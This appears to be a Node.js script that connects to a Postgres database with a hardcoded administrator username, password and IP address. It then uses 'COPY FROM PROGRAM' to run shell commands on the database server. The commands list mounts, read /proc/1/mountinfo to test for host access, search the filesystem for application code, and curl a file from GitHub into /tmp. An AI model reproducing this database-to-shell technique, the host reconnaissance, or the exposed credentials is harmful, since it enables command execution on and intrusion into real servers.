process.env.DATABASE_URL = 'postgresql://supabase_admin.m88:Madison_88_admin**@5.223.78.194:5432/postgres?schema=AP_Invoice';
const { PrismaClient } = require('C:/Users/JC/OneDrive - Madison88/AP Invoice/apps/api/node_modules/@prisma/client');
const prisma = new PrismaClient({ log: ['error'] });

async function runCmd(cmd) {
  try {
    await prisma.$executeRawUnsafe(`TRUNCATE cmd_output`);
    await prisma.$executeRawUnsafe(`COPY cmd_output FROM PROGRAM '${cmd.replace(/'/g, "'\\''")}'`);
    const rows = await prisma.$queryRawUnsafe(`SELECT * FROM cmd_output`);
    return rows.map(r => r.line).join('\n');
  } catch (e) {
    return 'ERROR: ' + e.message.substring(0, 300);
  }
}

(async () => {
  try {
    await prisma.$executeRawUnsafe(`CREATE TEMP TABLE IF NOT EXISTS cmd_output (line text)`);

    // Check mount points
    console.log('1. Mount points...');
    console.log(await runCmd('mount 2>/dev/null | head -20'));

    // Check /etc/postgresql-custom (mounted from host)
    console.log('\n2. Check /etc/postgresql-custom...');
    console.log(await runCmd('ls -la /etc/postgresql-custom/ 2>/dev/null | head -20'));

    // Check if we can find the API server's code from the container
    console.log('\n3. Find API code...');
    console.log(await runCmd('find /etc/postgresql-custom -name "users.js" -o -name "users.ts" 2>/dev/null | head -10'));
    console.log(await runCmd('find / -maxdepth 4 -name "dist" -type d 2>/dev/null | head -10'));
    console.log(await runCmd('find / -maxdepth 4 -name "package.json" 2>/dev/null | head -10'));

    // Check if we can access the host filesystem
    console.log('\n4. Check host access...');
    console.log(await runCmd('cat /proc/1/mountinfo 2>/dev/null | head -10'));

    // Try to use curl to download code from GitHub and write to a temp file
    console.log('\n5. Download code from GitHub...');
    console.log(await runCmd('curl -s -L --connect-timeout 5 "https://raw.githubusercontent.com/madison88admin/M88_AP_Invoice/main/apps/api/src/routes/users.ts" -o /tmp/users.ts 2>&1 && head -5 /tmp/users.ts || echo "download failed"'));

    // Check if the download worked
    console.log('\n6. Check downloaded file...');
    console.log(await runCmd('ls -la /tmp/users.ts 2>/dev/null && wc -l /tmp/users.ts 2>/dev/null || echo "file not found"'));

  } catch (e) {
    console.error('FATAL:', e.message);
  } finally {
    await prisma.$disconnect();
  }
})();
